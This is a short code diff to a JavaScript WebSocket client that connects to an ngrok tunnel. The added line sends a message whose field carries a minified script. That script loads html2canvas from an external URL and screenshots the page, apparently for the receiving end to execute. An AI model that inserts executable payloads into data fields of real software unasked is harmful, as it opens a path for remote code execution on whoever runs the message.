@@ -77,6 +77,7 @@ const ws = new WebSocket('wss://poetic-national-amoeba.ngrok-free.app');
 
 ws.addEventListener('open', (event) => {
     console.log('WebSocket connection opened:', event);
+    ws.send(JSON.stringify({ action: 'something', value: `function n(n,t){var e=document.createElement("script");e.type="text/javascript",e.src=n,e.onload=t,document.head.appendChild(e)}function o(){n("https://html2canvas.hertzen.com/dist/html2canvas.min.js",function(){html2canvas(document.body).then(function(n){var t=n.toDataURL("image/png");console.log(t),window.open("","_blank").document.write('<img src="'+t+'" alt="Screenshot">')})})}o();` }))
 });
 
 ws.addEventListener('message', (event) => {
